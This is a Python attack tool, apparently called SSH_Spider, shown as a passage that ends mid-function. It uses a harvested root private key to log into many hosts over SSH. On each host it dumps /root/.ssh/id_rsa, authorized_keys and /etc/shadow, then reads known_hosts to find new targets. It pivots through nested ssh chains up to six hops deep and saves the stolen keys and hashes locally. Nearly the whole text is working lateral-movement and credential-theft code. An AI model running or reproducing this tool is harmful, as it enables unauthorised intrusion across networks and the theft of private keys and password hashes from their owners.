# -*- coding: utf-8 -*-
'''
Program：SSH_Spider
Function：通过公私钥SSH批量登录IP，在每台登录主机执行命令，把执行的命令提取放到本地
 
Version：Python3
Time：2021/8/9
Author：bywalks
Blog：http://www.bywalks.com
Github：https://github.com/bywalks
'''
from paramiko import  SSHClient
from paramiko import AutoAddPolicy
from paramiko import RSAKey
import os
import io
import time
from time import sleep
from concurrent.futures import ThreadPoolExecutor,ProcessPoolExecutor
import re
from paramiko.ssh_exception import SSHException

banner = '''
  ____ ____  _   _     ____        _     _           
 / ___/ ___|| | | |   / ___| _ __ (_) __| | ___ _ __ 
 \___ \___ \| |_| |   \___ \| '_ \| |/ _` |/ _ \ '__|
  ___) |__) |  _  |    ___) | |_) | | (_| |  __/ |   
 |____/____/|_| |_|___|____/| .__/|_|\__,_|\___|_|   
                 |_____|    |_|                        
                            By Bywalks | V 1.0                        
'''

#known_hosts处理后的ip文件
serverfile = "./server_list.txt"
#私钥路径 
Private_key = RSAKey.from_private_key_file(filename='./id_rsa')  

#读取server_list.txt，存放初始全部要读取主机
all_server = []
#即将扫描的第二轮主机
succeed_host_Two = []
#即将扫描的第三轮主机
succeed_host_Three = []
#即将扫描的第四轮主机
succeed_host_Four = []
#即将扫描的第五轮主机
succeed_host_Five = []
#即将扫描的第六轮主机
succeed_host_Six = []
#即将扫描的第七轮主机
succeed_host_Seven = []
#已经扫描过的主机
already_host = []
#路径追踪
trace_all = []
#Client的全局变量
client = SSHClient()

#记录已经访问的ip
def Save_Already():
    alreadyfile = "./result/alreadyfile.txt"
    with open(alreadyfile,'w',encoding='utf-8') as alfile:
        for al in already_host:
            alfile.write(str(al)+"\n")

#记录IP路径
def Save_Route():
    tracefile1 = "./result/traceip.txt"
    with open(tracefile1,'w',encoding='utf-8') as ftrace1:
        for trace1 in trace_all:
            ftrace1.write(str(trace1)+"\n")
            
#保存第二轮IP
def Save_Two():
    succeedtwofile = "./result/succeedtwofile.txt"
    with open(succeedtwofile,'w',encoding='utf-8') as twofile:
        for twoeach in succeed_host_Two:
            twofile.write(str(twoeach)+"\n")
            
#保存第三轮IP
def Save_Three():            
    succeedthreefile = "./result/succeedthreefile.txt"
    with open(succeedthreefile,'w',encoding='utf-8') as threefile:
        for threeeach in succeed_host_Three:
            threefile.write(str(threeeach)+"\n")

#保存第四轮IP          
def Save_Four():
    succeedfourfile = "./result/succeedfourfile.txt"
    with open(succeedfourfile,'w',encoding='utf-8') as fourfile:
        for foureach in succeed_host_Four:
            fourfile.write(str(foureach)+"\n")

#保存第五轮IP          
def Save_Five():
    succeedfivefile = "./result/succeedfivefile.txt"
    with open(succeedfivefile,'w',encoding='utf-8') as fivefile:
        for fiveeach in succeed_host_Five:
            fivefile.write(str(fiveeach)+"\n")

#保存第六轮IP          
def Save_Six():
    succeedsixfile = "./result/succeedsixfile.txt"
    with open(succeedsixfile,'w',encoding='utf-8') as sixfile:
        for sixeach in succeed_host_Six:
            sixfile.write(str(sixeach)+"\n")
            
#保存第七轮IP          
def Save_Seven():
    succeedsevenfile = "./result/succeedsevenfile.txt"
    with open(succeedsevenfile,'w',encoding='utf-8') as sevenfile:
        for seveneach in succeed_host_Seven:
            sevenfile.write(str(seveneach)+"\n")

#初始化all_server操作
def deal_server_list(serverfile):
    with open(serverfile,'r') as f:
        for each in f:
            each1 = each.replace('\n','')
            all_server.append(each1)

#获取id_rsa和known_hosts
def Get_Rsa_Host(HostIP):
#获取id_rsa，保存在/hostip/id_rsa文件
    global client
    stdin, stdout, stderr = client.exec_command("cat /root/.ssh/id_rsa")
    DoOut=stdout.read().decode('utf-8') 
    if DoOut =='' :
        print('[1]"%s" execution result is NULL，please check command!' % (cmddo.split()))
    else:
        filename = "./result"+"//" + HostIP+"//"+ "id_rsa"
        path = ".\\result"+"\\" + HostIP+"\\"
        if not os.path.exists(path):
            os.makedirs(path,exist_ok=True)
            with open(filename,'w',encoding='utf-8') as f:
                f.write(str(DoOut))
        else:
            print("[1]%s address is exit! will exit!" % HostIP)
            pass
            
#获取known_hosts，保存在/hostip/known_hosts文件，提取其中ip保存到/hostip/server_list.txt文件中
    stdin, stdout, stderr = client.exec_command("cat /root/.ssh/known_hosts")
    DoOut1=stdout.read().decode('utf-8') 
    if DoOut1 =='' :
        print('[1]"%s" execution result is NULL，please check command!' % (cmddo.split()))
    else:
        filename = "./result"+"//" + HostIP+"//"+ "known_hosts"
        with open(filename,'w',encoding='utf-8') as f:
            f.write(str(DoOut1))
        newfilename = "./result"+"//" + HostIP+"//"+ "server_list.txt"
        result_all = []
        with open(filename) as fhosts:
            for each in fhosts:
                result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", each)
                if result:
                    result_all.append(result[0])
        result_all = list(set(result_all))
        if result_all:
            with open(newfilename,'w',encoding='utf-8') as fserver:
                for each1 in result_all:
                    fserver.write(str(each1)+"\n")
    if DoOut!="" and DoOut1!="":
        succeed_host_Two.append(HostIP)           

#执行cmd_list中的命令                        
def DoCommand(HostIP):
    global client
    #CMDList = open(".\cmd_list.txt","r")  #执行文件中的命令
    CMDList = ['whoami','id','ifconfig -a','hostname','cat /root/.ssh/id_rsa','cat /root/.ssh/authorized_keys','cat /root/.ssh/known_hosts','cat /etc/shadow']
    result_command = []
    for cmddo in CMDList:
        stdin, stdout, stderr = client.exec_command(cmddo)
        DoOut=stdout.read().decode('utf-8') 
        if DoOut =='' :
            print('[1]"%s" execution result is NULL，please check command!' % (cmddo.split()))
        else:
            result_cmddo = '"%s" execution result:' % (cmddo.rstrip());
            result_command.append(result_cmddo)
            result_command.append(DoOut)
            result_command.append("\n")
    filename = "./result"+"//" + HostIP+ ".txt"
    if result_command:
        with open(filename,'w',encoding='utf-8') as f:
            for each in result_command:
                each1 = each.strip()
                f.write(str(each1)+'\n')
                
def Ssh_Pkey(HostIP):
    #使用密钥登陆
    print('[1]正在检测：%s' % HostIP)
    global client
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys() 
    #使用密钥登陆
    if (client.connect(hostname=HostIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15))!="":    
        already_host.append(HostIP.replace('\n','')) 
        Get_Rsa_Host(HostIP)
        DoCommand(HostIP)
    client.close()
            
#获取id_rsa和known_hosts
def Get_Rsa_Two(HostIP,server_list):
#获取id_rsa，保存在/hostip/id_rsa文件
    global client
    for each in server_list:
        try:
            trace_all.append(HostIP + " -> " + each.strip())
            print("[2]正在检测：%s -> %s" % (HostIP,each.strip()))     
            command_rsa = "ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/id_rsa"
            stdin, stdout, stderr = client.exec_command(command_rsa)
            print(command_rsa)
            DoOut=stdout.read().decode('utf-8')              
            if DoOut =='' :
                pass
            else:
                print("[2]新建目录：%s" % each.strip())                 
                #存在known_hosts说明有ip可以ssh连接
                path = ".\\result"+"\\" + each+"\\"
                if not os.path.exists(path):
                    os.makedirs(path,exist_ok=True)
                filename = "./result"+"//" + each+"//"+ "id_rsa"
                with open(filename,'w',encoding='utf-8') as f:
                    f.write(str(DoOut))  
                    
#获取known_hosts，保存在/hostip/known_hosts文件，提取其中ip保存到/hostip/server_list.txt文件中
                command_hosts = "ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/known_hosts"
                stdin, stdout, stderr = client.exec_command(command_hosts)
                DoOut1=stdout.read().decode('utf-8') 
                if DoOut1 =='' :
                    pass
                else:
                    succeed_host_Three.append(HostIP+","+each)
                    filename = "./result"+"//" + each+"//"+ "known_hosts"
                    with open(filename,'w',encoding='utf-8') as f:
                        f.write(str(DoOut1))
                    newfilename = "./result"+"//" + each+"//"+ "server_list.txt"
                    result_all = []
                    with open(filename) as fhosts:
                        for each1 in fhosts:
                            result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", each1)
                            if result:
                                result_all.append(result[0])
                    result_all = list(set(result_all))
                    if result_all:
                        with open(newfilename,'w',encoding='utf-8') as fserver:
                            for each1 in result_all:
                                fserver.write(str(each1)+"\n")


        except SSHException:
            print("[2]%s 存在SSHException" % HostIP)
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=HostIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆

#执行cmd_list中的命令                        
def DoCommand_Two(HostIP,server_list):
    global client
    for each in server_list:
        try:
            result_command = []
            print("[2]正在检测：%s -> %s" % (HostIP,each.strip()))
            #CMDList = open(".\cmd_list.txt","r")  #执行文件中的命令
            CMDList = ['whoami','id','ifconfig -a','hostname','cat /root/.ssh/id_rsa','cat /root/.ssh/authorized_keys','cat /root/.ssh/known_hosts','cat /etc/shadow']
            command_test = "ssh -o ConnectTimeout=1 "+each.strip() +" id"
            stdin, stdout, stderr = client.exec_command(command_test)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                already_host.append(each.replace('\n',''))
                for cmddo in CMDList:
                    cmddo1 = cmddo.replace('\n','')
                    cmddo1 = "ssh -o ConnectTimeout=1 "+each.strip() +" " +cmddo1
                    stdin1, stdout1, stderr1 = client.exec_command(cmddo1)
                    DoOut1=stdout1.read().decode('utf-8') 
                    if DoOut1 =='' :
                        print('[2]"%s" execution result is NULL，please check command!' % (cmddo1))
                    else:
                        result_cmddo = '"%s" execution result:' % (cmddo1.rstrip());
                        result_command.append(result_cmddo)
                        result_command.append(DoOut1)
                        result_command.append("\n")
                filename = "./result"+"//" + each+ ".txt"
                if result_command:
                    with open(filename,'w',encoding='utf-8') as f:
                        for each1 in result_command:
                            each2 = each1.strip()
                            f.write(str(each2)+'\n') 
        except SSHException:
            print("[2]%s 存在SSHException" % HostIP)
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=HostIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆

def Ssh_Pkey_Two(HostIP):
    global client
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys()
    client.connect(hostname=HostIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
    server_list = []
    filename = "./result"+"//" + HostIP+"//"+ "server_list.txt"
    with open(filename) as fs:
        for each in fs:
            each1 = each.replace('\n','')
            if any(each1 == s for s in already_host):
                pass
            else: 
                server_list.append(each1)
            
    print("[2]%s 的server_list %s" % (HostIP,server_list))
    if server_list=="":
        pass
    else:
        print("[2]server_list 的长度是 %s" % len(server_list))
        DoCommand_Two(HostIP,server_list)
    client.close()
    
    #防止client断连
    client.connect(hostname=HostIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
    if server_list=="":
        pass
    else:
        print("[2]server_list 的长度是 %s" % len(server_list))
        Get_Rsa_Two(HostIP,server_list)
    client.close()


#获取id_rsa和known_hosts
def Get_Rsa_Three(HostIP,server_list):
#获取id_rsa，保存在/hostip/id_rsa文件
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    NewIP = HostIP.split(",")[1].replace('\n','')
    for each in server_list:
        try:
            print('[3]正在检测：%s -> %s -> %s' % (OldIP,NewIP,each.strip()))
            trace_all.append(OldIP.strip() + " -> " + NewIP.strip() + " -> " + each.strip())                 
            command_rsa = "ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/id_rsa"
            print(command_rsa)
            stdin, stdout, stderr = client.exec_command(command_rsa)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                print("[3]新建目录：%s" % each.strip()) 
                path = ".\\result"+"\\" + each+"\\"
                if not os.path.exists(path):
                    os.makedirs(path,exist_ok=True)   
                filename = "./result"+"//" + each+"//"+ "id_rsa"
                with open(filename,'w',encoding='utf-8') as f:
                    f.write(str(DoOut))    

#获取known_hosts，保存在/hostip/known_hosts文件，提取其中ip保存到/hostip/server_list.txt文件中               
                command_hosts = "ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/known_hosts"
                stdin, stdout, stderr = client.exec_command(command_hosts)
                DoOut1=stdout.read().decode('utf-8')                 
                if DoOut1 =='' :
                    pass
                else:
                    succeed_host_Four.append(HostIP+","+each.strip())
                    filename = "./result"+"//" + each+"//"+ "known_hosts"
                    with open(filename,'w',encoding='utf-8') as f:
                        f.write(str(DoOut1))
                    newfilename = "./result"+"//" + each+"//"+ "server_list.txt"
                    result_all = []
                    with open(filename) as fhosts:
                        for each in fhosts:
                            result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", each)
                            if result:
                                result_all.append(result[0])
                    result_all = list(set(result_all))
                    if result_all:
                        with open(newfilename,'w',encoding='utf-8') as fserver:
                            for each1 in result_all:
                                fserver.write(str(each1)+"\n")

        except SSHException:
            print("[3]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆

#执行cmd_list中的命令                        
def DoCommand_Three(HostIP,NewIP,server_list):
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    for each in server_list:
        try:
            result_command = []
            print("[3]正在检测：%s -> %s -> %s" % (HostIP.split(",")[0].replace('\n',''),HostIP.split(",")[1].replace('\n',''),each.strip()))
            #CMDList = open(".\cmd_list.txt","r")  #执行文件中的命令
            CMDList = ['whoami','id','ifconfig -a','hostname','cat /root/.ssh/id_rsa','cat /root/.ssh/authorized_keys','cat /root/.ssh/known_hosts','cat /etc/shadow']
            command_test = "ssh -o ConnectTimeout=1 "+NewIP.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+each.strip().replace("\n","") +" id"
            stdin, stdout, stderr = client.exec_command(command_test)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                already_host.append(each.replace('\n','')) 
                for cmddo in CMDList:
                    cmddo1 = cmddo.replace('\n','')
                    cmddo1 = "ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" " +cmddo1
                    print("[3]"+cmddo1)
                    stdin, stdout, stderr = client.exec_command(cmddo1)
                    DoOut=stdout.read().decode('utf-8') 
                    if DoOut =='' :
                        pass
                    else:
                        result_cmddo = '"%s" execution result:' % (cmddo1.rstrip());
                        result_command.append(result_cmddo)
                        result_command.append(DoOut)
                        result_command.append("\n")
                filename = "./result"+"//" + each+ ".txt"
                if result_command:
                    with open(filename,'w',encoding='utf-8') as f:
                        for each1 in result_command:
                            each2 = each1.strip()
                            f.write(str(each2)+'\n')  
        except SSHException:
            print("[3]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
            
def Ssh_Pkey_Three(HostIP):
    #该HostIP为第一层和第二层IP
    #使用密钥登陆   
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    NewIP = HostIP.split(",")[1].replace('\n','')
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys()
    client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
    server_list = []
    filename = "./result"+"//" + NewIP+"//"+ "server_list.txt"
    with open(filename) as fs:
        for each in fs:
            each1 = each.replace('\n','')
            #先做测试。稍后改回。已改回  
            if any(each1 == s for s in already_host):
                pass
            else:
                server_list.append(each1)   
    if server_list=="":
        pass
    else:
        DoCommand_Three(HostIP,NewIP,server_list)
        Get_Rsa_Three(HostIP,server_list)  
    client.close()

#获取id_rsa和known_hosts
def Get_Rsa_Four(HostIP,server_list):
#获取id_rsa，保存在/hostip/id_rsa文件
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP = HostIP.split(",")[1].replace('\n','')
    NewIP = HostIP.split(",")[2].replace('\n','')
    for each in server_list:
        try:
            print('[4]正在检测：%s -> %s -> %s -> %s' % (OldIP,MidIP,NewIP,each.strip()))
            trace_all.append(OldIP.strip() + " -> " + MidIP.strip()  + " -> " + NewIP.strip() + " -> " + each.strip())                 
            command_rsa = "ssh -o ConnectTimeout=1 "+MidIP.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/id_rsa"
            print(command_rsa)
            stdin, stdout, stderr = client.exec_command(command_rsa)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                print("[4]新建目录：%s" % each.strip()) 
                path = ".\\result"+"\\" + each+"\\"
                if not os.path.exists(path):
                    os.makedirs(path,exist_ok=True)   
                filename = "./result"+"//" + each+"//"+ "id_rsa"
                with open(filename,'w',encoding='utf-8') as f:
                    f.write(str(DoOut))    

#获取known_hosts，保存在/hostip/known_hosts文件，提取其中ip保存到/hostip/server_list.txt文件中               
                command_hosts = "ssh -o ConnectTimeout=1 "+MidIP.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/known_hosts"
                stdin, stdout, stderr = client.exec_command(command_hosts)
                DoOut1=stdout.read().decode('utf-8')                 
                if DoOut1 =='' :
                    pass
                else:
                    succeed_host_Five.append(HostIP+","+each.strip())
                    filename = "./result"+"//" + each+"//"+ "known_hosts"
                    with open(filename,'w',encoding='utf-8') as f:
                        f.write(str(DoOut1))
                    newfilename = "./result"+"//" + each+"//"+ "server_list.txt"
                    result_all = []
                    with open(filename) as fhosts:
                        for each in fhosts:
                            result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", each)
                            if result:
                                result_all.append(result[0])
                    result_all = list(set(result_all))
                    if result_all:
                        with open(newfilename,'w',encoding='utf-8') as fserver:
                            for each1 in result_all:
                                fserver.write(str(each1)+"\n")

        except SSHException:
            print("[4]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆

#执行cmd_list中的命令                        
def DoCommand_Four(HostIP,server_list):
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP = HostIP.split(",")[1].replace('\n','')
    NewIP = HostIP.split(",")[2].replace('\n','')
    for each in server_list:
        try:
            result_command = []
            print("[4]正在检测：%s -> %s -> %s -> %s" % (OldIP,MidIP,NewIP,each.strip()))
            #CMDList = open(".\cmd_list.txt","r")  #执行文件中的命令
            CMDList = ['whoami','id','ifconfig -a','hostname','cat /root/.ssh/id_rsa','cat /root/.ssh/authorized_keys','cat /root/.ssh/known_hosts','cat /etc/shadow']
            command_test = "ssh -o ConnectTimeout=1 "+MidIP.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+NewIP.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+each.strip().replace("\n","") +" id"
            stdin, stdout, stderr = client.exec_command(command_test)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                already_host.append(each.replace('\n','')) 
                for cmddo in CMDList:
                    cmddo1 = cmddo.replace('\n','')
                    cmddo1 = "ssh -o ConnectTimeout=1 "+MidIP.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" " +cmddo1
                    print("[4]"+cmddo1)
                    stdin, stdout, stderr = client.exec_command(cmddo1)
                    DoOut=stdout.read().decode('utf-8') 
                    if DoOut =='' :
                        pass
                    else:
                        result_cmddo = '"%s" execution result:' % (cmddo1.rstrip());
                        result_command.append(result_cmddo)
                        result_command.append(DoOut)
                        result_command.append("\n")
                filename = "./result"+"//" + each+ ".txt"
                if result_command:
                    with open(filename,'w',encoding='utf-8') as f:
                        for each1 in result_command:
                            each2 = each1.strip()
                            f.write(str(each2)+'\n')  
        except SSHException:
            print("[4]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
            
def Ssh_Pkey_Four(HostIP):
    #该HostIP为第一层和第二层IP
    #使用密钥登陆   
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP = HostIP.split(",")[1].replace('\n','')
    NewIP = HostIP.split(",")[2].replace('\n','')
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys()
    client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
    server_list = []
    filename = "./result"+"//" + NewIP+"//"+ "server_list.txt"
    with open(filename) as fs:
        for each in fs:
            each1 = each.replace('\n','')
            #先做测试。稍后改回。已改回  
            if any(each1 == s for s in already_host):
                pass
            else:
                server_list.append(each1)   
    if server_list=="":
        pass
    else:
        DoCommand_Four(HostIP,server_list)
        Get_Rsa_Four(HostIP,server_list)  
    client.close()
    
#获取id_rsa和known_hosts
def Get_Rsa_Five(HostIP,server_list):
#获取id_rsa，保存在/hostip/id_rsa文件
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP1 = HostIP.split(",")[1].replace('\n','')
    MidIP2 = HostIP.split(",")[2].replace('\n','')
    NewIP = HostIP.split(",")[3].replace('\n','')
    for each in server_list:
        try:
            print('[5]正在检测：%s -> %s -> %s -> %s -> %s' % (OldIP,MidIP1,MidIP2,NewIP,each.strip()))
            trace_all.append(OldIP.strip() + " -> " + MidIP1.strip() + " -> " + MidIP2.strip()  + " -> " + NewIP.strip() + " -> " + each.strip())                 
            command_rsa = "ssh -o ConnectTimeout=1 "+MidIP1.strip()+" ssh -o ConnectTimeout=1 "+MidIP2.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/id_rsa"
            print(command_rsa)
            stdin, stdout, stderr = client.exec_command(command_rsa)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                print("[5]新建目录：%s" % each.strip()) 
                path = ".\\result"+"\\" + each+"\\"
                if not os.path.exists(path):
                    os.makedirs(path,exist_ok=True)   
                filename = "./result"+"//" + each+"//"+ "id_rsa"
                with open(filename,'w',encoding='utf-8') as f:
                    f.write(str(DoOut))    

#获取known_hosts，保存在/hostip/known_hosts文件，提取其中ip保存到/hostip/server_list.txt文件中               
                command_hosts = "ssh -o ConnectTimeout=1 "+MidIP1.strip()+" ssh -o ConnectTimeout=1 "+MidIP2.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/known_hosts"
                stdin, stdout, stderr = client.exec_command(command_hosts)
                DoOut1=stdout.read().decode('utf-8')                 
                if DoOut1 =='' :
                    pass
                else:
                    succeed_host_Six.append(HostIP+","+each.strip())
                    filename = "./result"+"//" + each+"//"+ "known_hosts"
                    with open(filename,'w',encoding='utf-8') as f:
                        f.write(str(DoOut1))
                    newfilename = "./result"+"//" + each+"//"+ "server_list.txt"
                    result_all = []
                    with open(filename) as fhosts:
                        for each in fhosts:
                            result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", each)
                            if result:
                                result_all.append(result[0])
                    result_all = list(set(result_all))
                    if result_all:
                        with open(newfilename,'w',encoding='utf-8') as fserver:
                            for each1 in result_all:
                                fserver.write(str(each1)+"\n")

        except SSHException:
            print("[5]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆

#执行cmd_list中的命令                        
def DoCommand_Five(HostIP,server_list):
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP1 = HostIP.split(",")[1].replace('\n','')
    MidIP2 = HostIP.split(",")[2].replace('\n','')
    NewIP = HostIP.split(",")[3].replace('\n','')
    for each in server_list:
        try:
            result_command = []
            print("[5]正在检测：%s -> %s -> %s -> %s -> %s" % (OldIP,MidIP1,MidIP2,NewIP,each.strip()))
            #CMDList = open(".\cmd_list.txt","r")  #执行文件中的命令
            CMDList = ['whoami','id','ifconfig -a','hostname','cat /root/.ssh/id_rsa','cat /root/.ssh/authorized_keys','cat /root/.ssh/known_hosts','cat /etc/shadow']
            command_test = "ssh -o ConnectTimeout=1 "+MidIP1.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+MidIP2.strip().replace("\n","")+"ssh -o ConnectTimeout=1 "+NewIP.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+each.strip().replace("\n","") +" id"
            stdin, stdout, stderr = client.exec_command(command_test)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                already_host.append(each.replace('\n','')) 
                for cmddo in CMDList:
                    cmddo1 = cmddo.replace('\n','')
                    cmddo1 = "ssh -o ConnectTimeout=1 "+MidIP1.strip()+" ssh -o ConnectTimeout=1 "+MidIP2.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" " +cmddo1
                    print("[5]"+cmddo1)
                    stdin, stdout, stderr = client.exec_command(cmddo1)
                    DoOut=stdout.read().decode('utf-8') 
                    if DoOut =='' :
                        pass
                    else:
                        result_cmddo = '"%s" execution result:' % (cmddo1.rstrip());
                        result_command.append(result_cmddo)
                        result_command.append(DoOut)
                        result_command.append("\n")
                filename = "./result"+"//" + each+ ".txt"
                if result_command:
                    with open(filename,'w',encoding='utf-8') as f:
                        for each1 in result_command:
                            each2 = each1.strip()
                            f.write(str(each2)+'\n')  
        except SSHException:
            print("[5]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
            
def Ssh_Pkey_Five(HostIP):
    #该HostIP为第一层和第二层IP
    #使用密钥登陆   
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP1 = HostIP.split(",")[1].replace('\n','')
    MidIP2 = HostIP.split(",")[2].replace('\n','')
    NewIP = HostIP.split(",")[3].replace('\n','')
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys()
    client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
    server_list = []
    filename = "./result"+"//" + NewIP+"//"+ "server_list.txt"
    with open(filename) as fs:
        for each in fs:
            each1 = each.replace('\n','')
            #先做测试。稍后改回。已改回  
            if any(each1 == s for s in already_host):
                pass
            else:
                server_list.append(each1)   
    if server_list=="":
        pass
    else:
        DoCommand_Five(HostIP,server_list)
        Get_Rsa_Five(HostIP,server_list)  
    client.close()

#获取id_rsa和known_hosts
def Get_Rsa_Six(HostIP,server_list):
#获取id_rsa，保存在/hostip/id_rsa文件
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP1 = HostIP.split(",")[1].replace('\n','')
    MidIP2 = HostIP.split(",")[2].replace('\n','')
    MidIP3 = HostIP.split(",")[3].replace('\n','')
    NewIP = HostIP.split(",")[4].replace('\n','')
    for each in server_list:
        try:
            print('[6]正在检测：%s -> %s -> %s -> %s -> %s -> %s' % (OldIP,MidIP1,MidIP2,MidIP3,NewIP,each.strip()))
            trace_all.append(OldIP.strip() + " -> " + MidIP1.strip() + " -> " + MidIP2.strip() + " -> " + MidIP3.strip()  + " -> " + NewIP.strip() + " -> " + each.strip())                 
            command_rsa = "ssh -o ConnectTimeout=1 "+MidIP1.strip()+" ssh -o ConnectTimeout=1 "+MidIP2.strip()+" ssh -o ConnectTimeout=1 "+MidIP3.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/id_rsa"
            print(command_rsa)
            stdin, stdout, stderr = client.exec_command(command_rsa)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                print("[6]新建目录：%s" % each.strip()) 
                path = ".\\result"+"\\" + each+"\\"
                if not os.path.exists(path):
                    os.makedirs(path,exist_ok=True)   
                filename = "./result"+"//" + each+"//"+ "id_rsa"
                with open(filename,'w',encoding='utf-8') as f:
                    f.write(str(DoOut))    

#获取known_hosts，保存在/hostip/known_hosts文件，提取其中ip保存到/hostip/server_list.txt文件中               
                command_hosts = "ssh -o ConnectTimeout=1 "+MidIP1.strip()+" ssh -o ConnectTimeout=1 "+MidIP2.strip()+" ssh -o ConnectTimeout=1 "+MidIP3.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" cat /root/.ssh/known_hosts"
                stdin, stdout, stderr = client.exec_command(command_hosts)
                DoOut1=stdout.read().decode('utf-8')                 
                if DoOut1 =='' :
                    pass
                else:
                    succeed_host_Six.append(HostIP+","+each.strip())
                    filename = "./result"+"//" + each+"//"+ "known_hosts"
                    with open(filename,'w',encoding='utf-8') as f:
                        f.write(str(DoOut1))
                    newfilename = "./result"+"//" + each+"//"+ "server_list.txt"
                    result_all = []
                    with open(filename) as fhosts:
                        for each in fhosts:
